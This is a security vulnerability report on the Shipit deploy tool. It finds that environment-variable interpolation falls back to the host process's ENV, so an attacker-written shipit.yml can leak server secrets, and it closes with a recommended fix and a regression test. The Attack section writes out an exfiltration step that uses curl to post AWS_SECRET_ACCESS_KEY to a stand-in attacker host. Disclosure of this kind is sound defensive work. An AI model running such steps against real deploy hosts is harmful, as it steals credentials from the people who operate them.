This confirms the vulnerability is real: an attacker who controls their own repository's `shipit.yml` (via PR to their own fork/branch that becomes a review stack's `branch`) can add arbitrary `deploy`/`tasks` steps referencing any `$VARIABLE_NAME`. Since `DeploySpec::FileSystem` is built from the branch content [1](#0-0) , and `TaskCommands#steps`/`perform` build `Command.new(command_line, env:, chdir:)` from `@task.definition.steps` [2](#0-1) , any variable name not present in the merged `env` hash (`Shipit.env` + stack env + task-specific keys + `deploy_spec.machine_env` + `@task.env`) falls through to `ENV[variable]`—the Shipit host process's own environment—inside `EnvironmentVariables#interpolate`.

### Title
Unset `$VAR` references in attacker-controlled shipit.yml steps leak Shipit host process ENV secrets - (File: lib/shipit/environment_variables.rb)

### Summary
`EnvironmentVariables#interpolate` falls back to the Shipit host process's own `ENV` when a `$VARIABLE` referenced in a command step isn't found in the task/stack-scoped env hash. An attacker who controls `shipit.yml` for their own repository/branch (e.g., via a review-stack PR) can reference any variable name that happens to be set in the Shipit server's process environment, causing that secret's value to be substituted into a shell command executed on the deploy host for their own task, effectively exfiltrating it.

### Finding Description
The broken binding: an unpermissioned config author expects `@env.fetch(variable) { ENV[variable] }` for an unset name to resolve to `nil`/blank, but it instead resolves to `Shipit`'s own process environment value, i.e. `interpolated_value_for_unset_var == Shipit_host_process_ENV[var]`, not `"" / nil`.

Code path: `Command#interpolated_arguments` calls `interpolate_environment_variables` on `@args`, which calls `EnvironmentVariables.with(env).interpolate(argument)` [3](#0-2) . Inside `interpolate`, for each `$WORD` token, `@env.fetch(variable) { ENV[variable] }` is evaluated [4](#0-3) . `@env` here is `Command#env`, ultimately sourced from `TaskCommands#env`, which merges `Shipit.env`, `@stack.env`, some fixed task metadata, `deploy_spec.machine_env`, and `@task.env` [5](#0-4) . None of these sources are guaranteed to contain every variable name referenced in a step; `deploy_spec.machine_env`/steps content is attacker-controlled via `shipit.yml` on the PR/review-stack branch consumed by `DeploySpec::FileSystem` [1](#0-0) . The resulting interpolated argument is then passed straight into `PTY.spawn(unbundled_env, *interpolated_arguments, chdir: @chdir)` [6](#0-5) .

Attack: attacker opens a PR/pushes a branch on their own repository (or a repo they control that Shipit tracks as a review stack) with a `shipit.yml` `tasks`/`review`/`deploy` step such as `curl -d "$AWS_SECRET_ACCESS_KEY" https://attacker.example.com`, where `AWS_SECRET_ACCESS_KEY` is never defined in `task.env`, `stack.env`, or `deploy_spec.machine_env`. When the review stack task runs, `EnvironmentVariables#interpolate` substitutes `ENV['AWS_SECRET_ACCESS_KEY']` (the Shipit server process's own credential) into the command, and it is transmitted to the attacker's server as part of executing the attacker's own step.

Existing guards do not prevent this: `EnvironmentVariables#permit`/`sanitize_env_vars` (the whitelist path) only applies to explicitly user-submitted `env` params for triggering deploys/tasks via `Stack#trigger_task`/`filter_envs` [7](#0-6) ; it is never applied to `interpolate`, which is unconditionally used for every command's arguments in `Command#interpolated_arguments`. There is no check anywhere that a `$VAR` referenced in a step's command text is actually a member of the task/stack's whitelisted env before allowing fallback to process `ENV`.

### Impact Explanation
Any secret present in the Shipit host process's `ENV` (AWS keys, database credentials, other API tokens inherited from the init system/container) can be exfiltrated into a command executed for the attacker's own review-stack task, and thus sent off-host under attacker control. This is a Critical exfiltration of a deploy-time host secret via a path fully controlled by an unprivileged PR author, and it's repeatable against any variable name for as long as the corresponding secret exists in the host's `ENV`.

### Likelihood Explanation
Preconditions: the Shipit host process must actually have the targeted secret set in its own `ENV` (common in practice, since init systems/containers often inherit broad environment sets, e.g. cloud credentials, and `Command::BASE_ENV` derivation explicitly starts from `Bundler.unbundled_env`/`ENV`) [8](#0-7) . The attacker needs only the ability to have a `shipit.yml` with a custom step executed for a stack they control (review stacks are created automatically from PRs against a tracked repository) [9](#0-8) . No Shipit credentials or elevated role are required, making this cheap and repeatable.

### Recommendation
In `EnvironmentVariables#interpolate`, remove the `ENV[variable]` fallback entirely, or restrict it to a strict, explicit allowlist of infrastructure-level variable names that Shipit intentionally exposes (documented in the "Script parameters" list), raising/aborting or substituting an empty string for any other unresolved `$VAR` reference instead of silently reading the host process environment.

### Proof of Concept
```ruby
# test/lib/shipit/environment_variables_test.rb (new test)
test "#interpolate does not leak arbitrary host process ENV values for unset variables" do
  ENV['SECRET_TOKEN'] = 'super-secret-value'
  begin
    env = Shipit::EnvironmentVariables.with({}) # task/stack env lacking SECRET_TOKEN
    result = env.interpolate('curl -d $SECRET_TOKEN https://example.com')
    refute_includes result, 'super-secret-value'
  ensure
    ENV.delete('SECRET_TOKEN')
  end
end
```
Before the fix, `result` contains `super-secret-value` (the host process's `ENV['SECRET_TOKEN']`), demonstrating the leak; after removing the `ENV[variable]` fallback, the assertion passes.
